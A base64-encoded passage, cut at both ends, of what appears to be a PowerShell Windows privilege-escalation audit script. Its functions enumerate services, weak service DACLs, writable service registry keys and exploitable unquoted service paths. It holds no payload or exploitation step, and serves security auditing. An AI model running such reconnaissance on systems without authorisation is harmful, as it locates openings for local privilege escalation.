zaW9ucyA9IEAoJ1N0YXJ0JywgJ1N0b3AnKQogICAgICAgICAgICAgICAgJENoZWNrQWxsUGVybWlzc2lvbnNJblNldCA9ICRUcnVlICMgc28gd2UgY2hlY2sgYWxsIHBlcm1pc3Npb25zICYmIHN0eWxlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCRQZXJtaXNzaW9uU2V0IC1lcSAnQWxsQWNjZXNzJykgewogICAgICAgICAgICAgICAgJFRhcmdldFBlcm1pc3Npb25zID0gQCgnR2VuZXJpY0FsbCcsICdBbGxBY2Nlc3MnKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewoKICAgICAgICBGb3JFYWNoKCRJbmRpdmlkdWFsU2VydmljZSBpbiAkTmFtZSkgewoKICAgICAgICAgICAgJFRhcmdldFNlcnZpY2UgPSAkSW5kaXZpZHVhbFNlcnZpY2UgfCBBZGQtU2VydmljZURhY2wKCiAgICAgICAgICAgICMgV2UgbWlnaHQgbm90IGJlIGFibGUgdG8gYWNjZXNzIHRoZSBTZXJ2aWNlIGF0IGFsbCBzbyB3ZSBtdXN0IGNoZWNrIHdoZXRoZXIgQWRkLVNlcnZpY2VEYWNsIHJldHVybmVkIHNvbWV0aGluZy4KICAgICAgICAgICAgaWYgKCRUYXJnZXRTZXJ2aWNlIC1hbmQgJFRhcmdldFNlcnZpY2UuRGFjbCkgeyAKCiAgICAgICAgICAgICAgICAjIEVudW1lcmF0ZSBhbGwgZ3JvdXAgU0lEcyB0aGUgY3VycmVudCB1c2VyIGlzIGEgcGFydCBvZgogICAgICAgICAgICAgICAgJFVzZXJJZGVudGl0eSA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKQogICAgICAgICAgICAgICAgJEN1cnJlbnRVc2VyU2lkcyA9ICRVc2VySWRlbnRpdHkuR3JvdXBzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgVmFsdWUKICAgICAgICAgICAgICAgICRDdXJyZW50VXNlclNpZHMgKz0gJFVzZXJJZGVudGl0eS5Vc2VyLlZhbHVlCgogICAgICAgICAgICAgICAgIyBDaGVjayBhbGwgdGhlIERhY2wgb2JqZWN0cyBvZiB0aGUgY3VycmVudCBzZXJ2aWNlIAogICAgICAgICAgICAgICAgRm9yRWFjaCgkU2VydmljZURhY2wgaW4gJFRhcmdldFNlcnZpY2UuRGFjbCkgewoKICAgICAgICAgICAgICAgICAgICAkTWF0Y2hpbmdEYWNsRm91bmQgPSAkRmFsc2UKCiAgICAgICAgICAgICAgICAgICAgIyBBIERhY2wgb2JqZWN0IGNvbnRhaW5zIHR3byBwcm9wZXJ0aWVzIHdlIHdhbnQgdG8gY2hlY2s6IGEgU0lEIGFuZCBhIGxpc3Qgb2YgQWNjZXNzUmlnaHRzIAogICAgICAgICAgICAgICAgICAgICMgRmlyc3QsIHdlIHdhbnQgdG8gY2hlY2sgaWYgdGhlIGN1cnJlbnQgRGFjbCBTSUQgaXMgaW4gdGhlIGxpc3Qgb2YgU0lEcyBvZiB0aGUgY3VycmVudCB1c2VyIAogICAgICAgICAgICAgICAgICAgIGlmKCRDdXJyZW50VXNlclNpZHMgLWNvbnRhaW5zICRTZXJ2aWNlRGFjbC5TZWN1cml0eUlkZW50aWZpZXIpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRDaGVja0FsbFBlcm1pc3Npb25zSW5TZXQpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIElmIGEgUGVybWlzc2lvbiBTZXQgd2FzIHNwZWNpZmllZCwgd2Ugd2FudCB0byBtYWtlIHN1cmUgdGhhdCB3ZSBoYXZlIGFsbCB0aGUgbmVjZXNzYXJ5IGFjY2VzcyByaWdodHMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBbGxNYXRjaGVkID0gJFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2goJFRhcmdldFBlcm1pc3Npb24gaW4gJFRhcmdldFBlcm1pc3Npb25zKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBjaGVjayBwZXJtaXNzaW9ucyAmJiBzdHlsZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoJFNlcnZpY2VEYWNsLkFjY2Vzc1JpZ2h0cyAtYmFuZCAkQWNjZXNzTWFza1skVGFyZ2V0UGVybWlzc2lvbl0pIC1uZSAkQWNjZXNzTWFza1skVGFyZ2V0UGVybWlzc2lvbl0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBXcml0ZS1WZXJib3NlICJDdXJyZW50IHVzZXIgZG9lc24ndCBoYXZlICckVGFyZ2V0UGVybWlzc2lvbicgZm9yICQoJFRhcmdldFNlcnZpY2UuTmFtZSkiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBbGxNYXRjaGVkID0gJEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJEFsbE1hdGNoZWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0U2VydmljZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNYXRjaGluZ0RhY2xGb3VuZCA9ICRUcnVlIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2goJFRhcmdldFBlcm1pc3Npb24gaW4gJFRhcmdldFBlcm1pc3Npb25zKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBjaGVjayBwZXJtaXNzaW9ucyB8fCBzdHlsZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoJFNlcnZpY2VEYWNsLkFjZVR5cGUgLWVxICdBY2Nlc3NBbGxvd2VkJykgLWFuZCAoJFNlcnZpY2VEYWNsLkFjY2Vzc1JpZ2h0cyAtYmFuZCAkQWNjZXNzTWFza1skVGFyZ2V0UGVybWlzc2lvbl0pIC1lcSAkQWNjZXNzTWFza1skVGFyZ2V0UGVybWlzc2lvbl0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ3VycmVudCB1c2VyIGhhcyAnJFRhcmdldFBlcm1pc3Npb24nIHBlcm1pc3Npb24gZm9yICRJbmRpdmlkdWFsU2VydmljZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldFNlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1hdGNoaW5nRGFjbEZvdW5kID0gJFRydWUgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBpZiAoJE1hdGNoaW5nRGFjbEZvdW5kKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgQXMgc29vbiBhcyB3ZSBmaW5kIGEgbWF0Y2hpbmcgRGFjbCwgd2UgY2FuIHN0b3Agc2VhcmNoaW5nIAogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkVycm9yIGVudW1lcmF0aW5nIHRoZSBEYWNsIGZvciBzZXJ2aWNlICRJbmRpdmlkdWFsU2VydmljZSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLUluc3RhbGxlZFNlcnZpY2VzQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEVudW1lcmF0ZXMgbm9uLWRlZmF1bHQgc2VydmljZXMKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIEl0IHVzZXMgdGhlIGN1c3RvbSAiR2V0LVNlcnZpY2VMaXN0IiBmdW5jdGlvbiB0byBnZXQgYSBmaWx0ZXJlZCBsaXN0IG9mIHNlcnZpY2VzIHRoYXQgYXJlIAogICAgY29uZmlndXJlZCBvbiB0aGUgbG9jYWwgbWFjaGluZS4gVGhlbiBpdCByZXR1cm5zIGVhY2ggcmVzdWx0IGluIGEgY3VzdG9tIFBTIG9iamVjdCwgCiAgICBpbmRpY2F0aW5nIHRoZSBuYW1lLCBkaXNwbGF5IG5hbWUsIGJpbmFyeSBwYXRoLCB1c2VyIGFuZCBzdGFydCBtb2RlIG9mIHRoZSBzZXJ2aWNlLgogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gSW52b2tlLUluc3RhbGxlZFNlcnZpY2VzQ2hlY2sgfCBmdAoKICAgIE5hbWUgICAgRGlzcGxheU5hbWUgIEltYWdlUGF0aCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVc2VyICAgICAgICBTdGFydE1vZGUKICAgIC0tLS0gICAgLS0tLS0tLS0tLS0gIC0tLS0tLS0tLSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLS0tICAgICAgICAtLS0tLS0tLS0KICAgIFZNVG9vbHMgVk13YXJlIFRvb2xzICJDOlxQcm9ncmFtIEZpbGVzXFZNd2FyZVxWTXdhcmUgVG9vbHNcdm10b29sc2QuZXhlIiBMb2NhbFN5c3RlbSBBdXRvbWF0aWMKCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCgogICAgJEluc3RhbGxlZFNlcnZpY2VzUmVzdWx0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAoKICAgICMgR2V0IG9ubHkgdGhpcmQtcGFydHkgc2VydmljZXMgCiAgICAkRmlsdGVyZWRTZXJ2aWNlcyA9IEdldC1TZXJ2aWNlTGlzdCAtRmlsdGVyTGV2ZWwgMwogICAgV3JpdGUtVmVyYm9zZSAiRW51bWVyYXRpbmcgJCgkRmlsdGVyZWRTZXJ2aWNlcy5Db3VudCkgc2VydmljZXMuLi4iCgogICAgRm9yRWFjaCAoJFNlcnZpY2UgaW4gJEZpbHRlcmVkU2VydmljZXMpIHsKICAgICAgICAjIE1ha2UgYSBzaW1wbGlmaWVkIHZlcnNpb24gb2YgdGhlIFNlcnZpY2Ugb2JqZWN0LCB3ZSBvbmx5IGJhc2ljIGluZm9ybWF0aW9uIGZvciB0aHMgY2hlY2suCiAgICAgICAgJFNlcnZpY2VJdGVtID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCiAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTmFtZSIgLVZhbHVlICRTZXJ2aWNlLk5hbWUKICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJEaXNwbGF5TmFtZSIgLVZhbHVlICRTZXJ2aWNlLkRpc3BsYXlOYW1lCiAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSW1hZ2VQYXRoIiAtVmFsdWUgJFNlcnZpY2UuSW1hZ2VQYXRoCiAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVXNlciIgLVZhbHVlICRTZXJ2aWNlLlVzZXIKICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJTdGFydE1vZGUiIC1WYWx1ZSAkU2VydmljZS5TdGFydE1vZGUKICAgICAgICAjJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVHlwZSIgLVZhbHVlICRTZXJ2aWNlLlR5cGUKICAgICAgICBbdm9pZF0kSW5zdGFsbGVkU2VydmljZXNSZXN1bHQuQWRkKCRTZXJ2aWNlSXRlbSkKICAgIH0KCiAgICAkSW5zdGFsbGVkU2VydmljZXNSZXN1bHQKfQoKZnVuY3Rpb24gSW52b2tlLVNlcnZpY2VzUGVybWlzc2lvbnNSZWdpc3RyeUNoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBDaGVja3MgdGhlIHBlcm1pc3Npb25zIG9mIHRoZSBzZXJ2aWNlIHNldHRpbmdzIGluIHRoZSByZWdpc3RyeQoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgVGhlIGNvbmZpZ3VyYXRpb24gb2YgdGhlIHNlcnZpY2VzIGlzIG1haW50YWluZWQgaW4gdGhlIHJlZ2lzdHJ5LiBCZWluZyBhYmxlIHRvIG1vZGlmeSB0aGVzZQogICAgcmVnaXN0cnkga2V5cyBtZWFucyBiZWluZyBhYmxlIHRvIGNoYW5nZSB0aGUgc2V0dGluZ3Mgb2YgYSBzZXJ2aWNlLiBJbiBhZGRpdGlvbiwgYSBjb21wbGV0ZQogICAgbWFjaGluZSByZWJvb3QgaXNuJ3QgbmVjZXNzYXJ5IGZvciB0aGVzZSBzZXR0aW5ncyB0byBiZSB0YWtlbiBpbnRvIGFjY291bnQuIE9ubHkgdGhlIGFmZmVjdGVkCiAgICBzZXJ2aWNlIG5lZWRzIHRvIGJlIHJlc3RhcnRlZC4gCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtU2VydmljZXNQZXJtaXNzaW9uc1JlZ2lzdHJ5Q2hlY2sgCgogICAgTmFtZSAgICAgICAgICAgICAgOiBWdWxuU2VydmljZQogICAgSW1hZ2VQYXRoICAgICAgICAgOiBDOlxBUFBTXE15QXBwXHNlcnZpY2UuZXhlCiAgICBVc2VyICAgICAgICAgICAgICA6IExvY2FsU3lzdGVtCiAgICBNb2RpZmlhYmxlUGF0aCAgICA6IHtNaWNyb3NvZnQuUG93ZXJTaGVsbC5Db3JlXFJlZ2lzdHJ5OjpIS0VZX0xPQ0FMX01BQ0hJTkVcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFZ1bG5TZXJ2aWNlfQogICAgSWRlbnRpdHlSZWZlcmVuY2UgOiBCVUlMVElOXFVzZXJzCiAgICBQZXJtaXNzaW9ucyAgICAgICA6IHtXcml0ZU93bmVyLCBEZWxldGUsIFJlYWRDb250cm9sLCBSZWFkRGF0YS9MaXN0RGlyZWN0b3J5Li4ufQogICAgU3RhdHVzICAgICAgICAgICAgOiBVbmtub3duCiAgICBVc2VyQ2FuU3RhcnQgICAgICA6IEZhbHNlCiAgICBVc2VyQ2FuUmVzdGFydCAgICA6IEZhbHNlCgogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oKQogICAgCiAgICAjIEdldCBhbGwgc2VydmljZXMgZXhjZXB0IHRoZSBvbmVzIHdpdGggYW4gZW1wdHkgSW1hZ2VQYXRoIG9yIERyaXZlcnMgCiAgICAkQWxsU2VydmljZXMgPSBHZXQtU2VydmljZUxpc3QgLUZpbHRlckxldmVsIDIgCiAgICBXcml0ZS1WZXJib3NlICJFbnVtZXJhdGluZyAkKCRBbGxTZXJ2aWNlcy5Db3VudCkgc2VydmljZXMuLi4iCgogICAgRm9yRWFjaCAoJFNlcnZpY2UgaW4gJEFsbFNlcnZpY2VzKSB7CgogICAgICAgIEdldC1Nb2RpZmlhYmxlUmVnaXN0cnlQYXRoIC1QYXRoICRTZXJ2aWNlLlJlZ2lzdHJ5UGF0aCB8IFdoZXJlLU9iamVjdCB7JF8gLWFuZCAkXy5Nb2RpZmlhYmxlUGF0aCAtYW5kICgkXy5Nb2RpZmlhYmxlUGF0aCAtbmUgJycpfSB8IEZvcmVhY2gtT2JqZWN0IHsKCiAgICAgICAgICAgICRTdGF0dXMgPSAiVW5rbm93biIKICAgICAgICAgICAgIyBDYW4gd2UgcmVzdGFydCB0aGUgc2VydmljZT8KICAgICAgICAgICAgJFNlcnZpY2VSZXN0YXJ0ID0gVGVzdC1TZXJ2aWNlRGFjbFBlcm1pc3Npb24gLU5hbWUgJFNlcnZpY2UuTmFtZSAtUGVybWlzc2lvblNldCAnUmVzdGFydCcKICAgICAgICAgICAgaWYgKCRTZXJ2aWNlUmVzdGFydCkgeyAkVXNlckNhblJlc3RhcnQgPSAkVHJ1ZTsgJFN0YXR1cyA9ICRTZXJ2aWNlUmVzdGFydC5TdGF0dXMgfSBlbHNlIHsgJFVzZXJDYW5SZXN0YXJ0ID0gJEZhbHNlIH0KICAgIAogICAgICAgICAgICAjIENhbiB3ZSBzdGFydCB0aGUgc2VydmljZT8KICAgICAgICAgICAgJFNlcnZpY2VTdGFydCA9IFRlc3QtU2VydmljZURhY2xQZXJtaXNzaW9uIC1OYW1lICRTZXJ2aWNlLk5hbWUgLVBlcm1pc3Npb25zICdTdGFydCcKICAgICAgICAgICAgaWYgKCRTZXJ2aWNlU3RhcnQpIHsgJFVzZXJDYW5TdGFydCA9ICRUcnVlOyAkU3RhdHVzID0gJFNlcnZpY2VTdGFydC5TdGF0dXMgfSBlbHNlIHsgJFVzZXJDYW5TdGFydCA9ICRGYWxzZSB9CgogICAgICAgICAgICAkU2VydmljZUl0ZW0gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTmFtZSIgLVZhbHVlICRTZXJ2aWNlLk5hbWUKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSW1hZ2VQYXRoIiAtVmFsdWUgJFNlcnZpY2UuSW1hZ2VQYXRoCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlVzZXIiIC1WYWx1ZSAkU2VydmljZS5Vc2VyCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk1vZGlmaWFibGVQYXRoIiAtVmFsdWUgJF8uTW9kaWZpYWJsZVBhdGgKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSWRlbnRpdHlSZWZlcmVuY2UiIC1WYWx1ZSAkXy5JZGVudGl0eVJlZmVyZW5jZQogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJQZXJtaXNzaW9ucyIgLVZhbHVlICRfLlBlcm1pc3Npb25zCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlN0YXR1cyIgLVZhbHVlICRTdGF0dXMKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVXNlckNhblN0YXJ0IiAtVmFsdWUgJFVzZXJDYW5TdGFydAogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJVc2VyQ2FuUmVzdGFydCIgLVZhbHVlICRVc2VyQ2FuUmVzdGFydAogICAgICAgICAgICAkU2VydmljZUl0ZW0KICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1TZXJ2aWNlc1VucXVvdGVkUGF0aENoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBFbnVtZXJhdGVzIGFsbCB0aGUgc2VydmljZXMgd2l0aCBhbiB1bnF1b3RlZCBwYXRoLiBGb3IgZWFjaCBvbmUgb2YgdGhlbSwgZW51bWVyYXRlcyBwYXRocyB0aGF0IAogICAgdGhlIGN1cnJlbnQgdXNlciBjYW4gbW9kaWZ5LiBCYXNlZCBvbiB0aGUgb3JpZ2luYWwgIkdldC1TZXJ2aWNlVW5xdW90ZWQiIGZ1bmN0aW9uIGZyb20gCiAgICBQb3dlclVwLiAKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIEluIG15IHZlcnNpb24gb2YgdGhpcyBmdW5jdGlvbiwgSSB0cmllZCB0byBlbGltaW5hdGUgYXMgbXVjaCBmYWxzZSBwb3NpdGl2ZXMgYXMgcG9zc2libGUuCiAgICBQb3dlclVwIHRlbmRzIHRvIHJlcG9ydCAiQzpcIiBhcyBleHBsb2l0YWJsZSB3aGVuZXZlciBhIHByb2dyYW0gbG9jYXRlZCBpbiAiQzpcUHJvZ3JhbSAKICAgIEZpbGVzIiBpcyBpZGVudGlmaWVkLiBUaGUgcHJvYmxlbSBpcyB0aGF0IHdlIGNhbm5vdCB3cml0ZSAiQzpccHJvZ3JhbS5leGUiIHNvIHRoZSBzZXJ2aWNlCiAgICB3b3VsZG4ndCBiZSBleHBsb2l0YWJsZS4gV2UgY2FuIG9ubHkgY3JlYXRlIGZvbGRlcnMgaW4gIkM6XCIgYnkgZGVmYXVsdC4KICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEludm9rZS1TZXJ2aWNlc1VucXVvdGVkUGF0aENoZWNrCgogICAgTmFtZSAgICAgICAgICAgICAgOiBWdWxuU2VydmljZQogICAgSW1hZ2VQYXRoICAgICAgICAgOiBDOlxBUFBTXE15IEFwcFxzZXJ2aWNlLmV4ZQogICAgVXNlciAgICAgICAgICAgICAgOiBMb2NhbFN5c3RlbQogICAgTW9kaWZpYWJsZVBhdGggICAgOiBDOlxBUFBTCiAgICBJZGVudGl0eVJlZmVyZW5jZSA6IE5UIEFVVEhPUklUWVxBdXRoZW50aWNhdGVkIFVzZXJzCiAgICBQZXJtaXNzaW9ucyAgICAgICA6IHtEZWxldGUsIFdyaXRlQXR0cmlidXRlcywgU3luY2hyb25pemUsIFJlYWRDb250cm9sLi4ufQogICAgU3RhdHVzICAgICAgICAgICAgOiBVbmtub3duCiAgICBVc2VyQ2FuU3RhcnQgICAgICA6IEZhbHNlCiAgICBVc2VyQ2FuUmVzdGFydCAgICA6IEZhbHNlCiAgICAKICAgICM+CiAgICAKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKCkKCiAgICAjIEdldCBhbGwgc2VydmljZXMgd2hpY2ggaGF2ZSBhIG5vbi1lbXB0eSBJbWFnZVBhdGggKGV4Y2x1ZGUgZHJpdmVycyBhcyB3ZWxsKQogICAgJFNlcnZpY2VzID0gR2V0LVNlcnZpY2VMaXN0IC1GaWx0ZXJMZXZlbCAyCiAgICBXcml0ZS1WZXJib3NlICJFbnVtZXJhdGluZyAkKCRTZXJ2aWNlcy5Db3VudCkgc2VydmljZXMuLi4iCiAgICAKICAgICMgJFBlcm1pc3Npb25zQWRkRmlsZSA9IEAoIldyaXRlRGF0YS9BZGRGaWxlIiwgIkRlbGV0ZUNoaWxkIiwgIldyaXRlREFDIiwgIldyaXRlT3duZXIiKQogICAgIyAkUGVybWlzc2lvbnNBZGRGb2xkZXIgPSBAKCJBcHBlbmREYXRhL0FkZFN1YmRpcmVjdG9yeSIsICJEZWxldGVDaGlsZCIsICJXcml0ZURBQyIsICJXcml0ZU93bmVyIikKCiAgICBGb3JFYWNoICgkU2VydmljZSBpbiAkU2VydmljZXMpIHsKCiAgICAgICAgJEltYWdlUGF0aCA9ICRTZXJ2aWNlLkltYWdlUGF0aC50cmltKCkKCiAgICAgICAgI1dyaXRlLVZlcmJvc2UgIkNoZWNraW5nICRJbWFnZVBhdGggLi4uIgoKICAgICAgICBHZXQtRXhwbG9pdGFibGVVbnF1b3RlZFBhdGggLVBhdGggJEltYWdlUGF0aCB8IEZvckVhY2gtT2JqZWN0IHsKCiAgICAgICAgICAgICRTdGF0dXMgPSAiVW5rbm93biIKICAgICAgICAgICAgIyBDYW4gd2UgcmVzdGFydCB0aGUgc2VydmljZT8KICAgICAgICAgICAgJFNlcnZpY2VSZXN0YXJ0ID0gVGVzdC1TZXJ2aWNlRGFjbFBlcm1pc3Npb24gLU5hbWUgJFNlcnZpY2UuTmFtZSAtUGVybWlzc2lvblNldCAnUmVzdGFydCcKICAgICAgICAgICAgaWYgKCRTZXJ2aWNlUmVzdGFydCkgeyAkVXNlckNhblJlc3RhcnQgPSAkVHJ1ZTsgJFN0YXR1cyA9ICRTZXJ2aWNlUmVzdGFydC5TdGF0dXMgfSBlbHNlIHsgJFVzZXJDYW5SZXN0YXJ0ID0gJEZhbHNlIH0KICAgIAogICAgICAgICAgICAjIENhbiB3ZSBzdGFydCB0aGUgc2VydmljZT8KICAgICAgICAgICAgJFNlcnZpY2VTdGFydCA9IFRlc3QtU2VydmljZURhY2xQZXJtaXNzaW9uIC1OYW1lICRTZXJ2aWNlLk5hbWUgLVBlcm1pc3Npb25zICdTdGFydCcKICAgICAgICAgICAgaWYgKCRTZXJ2aWNlU3RhcnQpIHsgJFVzZXJDYW5TdGFydCA9ICRUcnVlOyAkU3RhdHVzID0gJFNlcnZpY2VTdGFydC5TdGF0dXMgfSBlbHNlIHsgJFVzZXJDYW5TdGFydCA9ICRGYWxzZSB9CgogICAgICAgICAgICAkU2VydmljZUl0ZW0gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTmFtZSIgLVZhbHVlICRTZXJ2aWNlLk5hbWUKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSW1hZ2VQYXRoIiAtVmFsdWUgJFNlcnZpY2UuSW1hZ2VQYXRoCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlVzZXIiIC1WYWx1ZSAkU2VydmljZS5Vc2VyCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk1vZGlmaWFibGVQYXRoIiAtVmFsdWUgJF8uTW9kaWZpYWJsZVBhdGgKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSWRlbnRpdHlSZWZlcmVuY2UiIC1WYWx1ZSAkXy5JZGVudGl0eVJlZmVyZW5jZQogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJQZXJtaXNzaW9ucyIgLVZhbHVlICRfLlBlcm1pc3Npb25zCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlN0YXR1cyIgLVZhbHVlICRTdGF0dXMKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVXNlckNhblN0YXJ0IiAtVmFsdWUgJFVzZXJDYW5TdGFydAogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJVc2VyQ2FuUmVzdGFydCIgLVZhbHVlICRVc2VyQ2FuUmVzdGFydAogICAgICAgICAgICAkU2VydmljZUl0ZW0KICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1TZXJ2aWNlc0ltYWdlUGVybWlzc2lvbnNDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgRW51bWVyYXRlcyBhbGwgdGhlIHNlcn